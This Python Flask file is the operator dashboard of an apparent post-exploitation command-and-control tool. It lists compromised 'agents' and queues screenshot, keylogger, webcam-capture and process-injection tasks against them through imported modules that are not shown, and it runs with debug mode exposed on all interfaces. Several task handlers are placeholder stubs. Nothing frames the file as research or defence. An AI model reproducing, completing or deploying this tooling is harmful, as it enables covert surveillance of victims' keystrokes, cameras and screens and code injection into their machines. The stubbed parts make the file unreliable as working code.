from flask import Flask, render_template, jsonify, request, send_file
import os
import json
import logging
from datetime import datetime
import threading
from modules.post_exploit import PostExploit
from modules.evasion import Evasion
from modules.keylogger import Keylogger
from modules.webcam import WebcamCapture
from modules.process_injection import ProcessInjection

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Global instances
post_exploit = PostExploit()
evasion = Evasion()
keylogger = Keylogger()
webcam = WebcamCapture()
process_injection = ProcessInjection()

# Store active tasks
active_tasks = {}

@app.route('/')
def index():
    """Main dashboard"""
    return render_template('index.html')

@app.route('/api/agents')
def get_agents():
    """Get list of connected agents"""
    try:
        # This would be replaced with actual agent data from the C2 server
        agents = [
            {
                'id': 'agent1',
                'ip': '192.168.1.100',
                'os': 'Windows',
                'last_seen': datetime.now().isoformat()
            }
        ]
        return jsonify({'status': 'success', 'agents': agents})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/tasks')
def get_tasks():
    """Get list of active tasks"""
    return jsonify({'status': 'success', 'tasks': active_tasks})

@app.route('/api/tasks', methods=['POST'])
def create_task():
    """Create a new task"""
    try:
        data = request.get_json()
        task_type = data.get('type')
        target = data.get('target')
        parameters = data.get('parameters', {})
        
        task_id = f"task_{len(active_tasks) + 1}"
        active_tasks[task_id] = {
            'type': task_type,
            'target': target,
            'parameters': parameters,
            'status': 'pending',
            'created_at': datetime.now().isoformat()
        }
        
        # Execute task based on type
        if task_type == 'screenshot':
            threading.Thread(target=execute_screenshot, args=(task_id,)).start()
        elif task_type == 'keylogger':
            threading.Thread(target=execute_keylogger, args=(task_id,)).start()
        elif task_type == 'webcam':
            threading.Thread(target=execute_webcam, args=(task_id,)).start()
        elif task_type == 'process_injection':
            threading.Thread(target=execute_process_injection, args=(task_id,)).start()
            
        return jsonify({'status': 'success', 'task_id': task_id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/tasks/<task_id>')
def get_task_status(task_id):
    """Get status of a specific task"""
    if task_id in active_tasks:
        return jsonify({'status': 'success', 'task': active_tasks[task_id]})
    return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/api/results/<task_id>')
def get_task_results(task_id):
    """Get results of a completed task"""
    try:
        if task_id in active_tasks:
            task = active_tasks[task_id]
            if task['status'] == 'completed':
                # This would be replaced with actual result retrieval
                return jsonify({
                    'status': 'success',
                    'results': {
                        'data': 'Task results here',
                        'timestamp': datetime.now().isoformat()
                    }
                })
        return jsonify({'status': 'error', 'message': 'Task not found or not completed'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def execute_screenshot(task_id):
    """Execute screenshot task"""
    try:
        active_tasks[task_id]['status'] = 'running'
        result = post_exploit.take_screenshot()
        active_tasks[task_id]['status'] = 'completed'
        active_tasks[task_id]['result'] = result
    except Exception as e:
        active_tasks[task_id]['status'] = 'failed'
        active_tasks[task_id]['error'] = str(e)

def execute_keylogger(task_id):
    """Execute keylogger task"""
    try:
        active_tasks[task_id]['status'] = 'running'
        keylogger.start()
        # This would be replaced with actual keylogger execution logic
        active_tasks[task_id]['status'] = 'completed'
    except Exception as e:
        active_tasks[task_id]['status'] = 'failed'
        active_tasks[task_id]['error'] = str(e)

def execute_webcam(task_id):
    """Execute webcam capture task"""
    try:
        active_tasks[task_id]['status'] = 'running'
        webcam.start()
        # This would be replaced with actual webcam capture logic
        active_tasks[task_id]['status'] = 'completed'
    except Exception as e:
        active_tasks[task_id]['status'] = 'failed'
        active_tasks[task_id]['error'] = str(e)

def execute_process_injection(task_id):
    """Execute process injection task"""
    try:
        active_tasks[task_id]['status'] = 'running'
        # This would be replaced with actual process injection logic
        active_tasks[task_id]['status'] = 'completed'
    except Exception as e:
        active_tasks[task_id]['status'] = 'failed'
        active_tasks[task_id]['error'] = str(e)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True) 